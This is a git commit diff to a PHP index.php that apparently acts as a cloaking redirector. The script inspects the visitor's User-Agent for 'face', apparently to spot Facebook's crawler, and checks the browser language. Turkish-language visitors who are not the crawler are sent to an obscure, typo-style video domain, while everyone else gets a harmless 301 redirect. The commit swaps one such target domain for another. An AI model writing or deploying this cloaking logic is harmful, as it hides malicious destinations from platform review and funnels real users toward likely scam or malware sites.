2080fe2bb0612ce4da74d54924c3e8238c697b58
sanernecro <sanernecro@gmail.com>
2017-08-07 20:35:09 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -3,17 +3,16 @@
 $ip_adres = $_SERVER['HTTP_USER_AGENT']; 
 $langs = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2);
 
-if($_GET['u']) {
 $sonuc = strpos($ip_adres,"face");
-if (($langs!=='tr') && ($sonuc === false))
+if (($langs=='tr') && ($sonuc === false))
     {
-header("Location: http://videochecxk.com/");
+header("Location: http://kodivdeo.com/");
     }
 else {
 header("HTTP/1.1 301 Moved Permanently");
-header("Location: https://www.facebook.com/");
-}
+header("Location: https://www.name.com/");
 die(); exit();
- }
+}
+
  
  ?>
